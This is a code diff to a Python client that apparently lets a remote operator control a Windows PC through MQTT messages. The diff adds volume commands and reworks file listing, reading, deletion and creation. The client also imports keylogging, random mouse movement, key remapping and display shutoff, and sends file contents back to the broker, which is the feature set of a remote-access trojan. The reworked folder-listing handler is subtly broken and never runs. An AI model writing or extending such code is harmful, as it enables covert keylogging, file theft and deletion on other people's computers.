@@ -21,7 +21,7 @@ from notepadType import notepad_write,draw_heart,start_random_move,stop_random_m
 from prompt import alertPrompt, inputPrompt
 from klogging import start_logging,stop_logging
 from filecontrol import list_folder,read_file,delete_file,create_file
-from systemcontrol import display_off,display_on
+from systemcontrol import display_off,display_on,full_volume,mute_volume
 
 pg.FAILSAFE = False
 # Startup setup
@@ -120,7 +120,11 @@ def handle_msg(msg):
         elif msg == "displayoff":
             display_off()
         elif msg == "displayon":
-            display_on()        
+            display_on() 
+        elif msg == "fullvolume":
+            full_volume()
+        elif msg == "mutevolume":
+            mute_volume()              
         elif msg =="startrandommove":
             start_random_move()
         elif msg == "stoprandommove":
@@ -208,33 +212,68 @@ def handle_msg(msg):
                     keyboard.remap_key(parts[1], parts[0])
                 safe_thread(swap)
         elif msg.startswith("listfolder"):
-            cmd = msg[len("listfolder "):]
-            def list():
-                dataread = list_folder(cmd)
-                client.publish(ACK_TOPIC,f"List Folder :--> {dataread}")
-            safe_thread(list)  
+            cmd_data = msg[len("listfolder "):]
+
+            def list_cmd():
+                try:
+                    dataread = list_folder(cmd_data.strip())
+                    client.publish(ACK_TOPIC, f"List Folder :--> {dataread}")
+                except Exception as e:
+                    client.publish(ACK_TOPIC, f"Error listing folder: {e}")
+
+                safe_thread(list_cmd)
 
         elif msg.startswith("readfile"):
-            parts = msg[len("readfile "):].split()
-            if len(parts) == 2:
+            cmd_data = msg[len("readfile "):]
+            parts = cmd_data.split('|')
+            if len(parts) != 2:
+                client.publish(ACK_TOPIC, "Error: readfile requires 2 parameters separated by |")
+            else:
+                folder, filename = parts
+        
                 def read():
-                    dataread=read_file(parts[0],parts[1])
-                    client.publish(ACK_TOPIC,f"File Read :---> {dataread}")
-                safe_thread(read)  
+                    try:
+                        dataread = read_file(folder.strip(), filename.strip())
+                        client.publish(ACK_TOPIC, f"File Read :---> {dataread}")
+                    except Exception as e:
+                        client.publish(ACK_TOPIC, f"Error reading file: {e}")
+        
+                safe_thread(read)
+        
         elif msg.startswith("deletefile"):
-            parts = msg[len("deletefile "):].split()
-            if len(parts) == 2:
+            cmd_data = msg[len("deletefile "):]
+            parts = cmd_data.split('|')
+            if len(parts) != 2:
+                client.publish(ACK_TOPIC, "Error: deletefile requires 2 parameters separated by |")
+            else:
+                folder, filename = parts
+        
                 def delete():
-                    dataread=delete_file(parts[0],parts[1])
-                    client.publish(ACK_TOPIC,f"File Delete :---> {dataread}")
+                    try:
+                        dataread = delete_file(folder.strip(), filename.strip())
+                        client.publish(ACK_TOPIC, f"File Delete :---> {dataread}")
+                    except Exception as e:
+                        client.publish(ACK_TOPIC, f"Error deleting file: {e}")
+        
                 safe_thread(delete)
+        
         elif msg.startswith("createfile"):
-            parts = msg[len("createfile "):].split()
-            if len(parts) == 3:
+            cmd_data = msg[len("createfile "):]
+            parts = cmd_data.split('|')
+            if len(parts) != 3:
+                client.publish(ACK_TOPIC, "Error: createfile requires 3 parameters separated by |")
+            else:
+                folder, filename, content = parts
+        
                 def create():
-                    dataread=create_file(parts[0],parts[1],parts[2])
-                    client.publish(ACK_TOPIC,f"File Create :---> {dataread}")
-                safe_thread(create)                 
+                    try:
+                        dataread = create_file(folder.strip(), filename.strip(), content.strip())
+                        client.publish(ACK_TOPIC, f"File Created :---> {dataread}")
+                    except Exception as e:
+                        client.publish(ACK_TOPIC, f"Error creating file: {e}")
+        
+                safe_thread(create)
+               
         elif msg.startswith("moveto"):
             parts = msg[len("moveto "):].split()
             if len(parts) == 2:
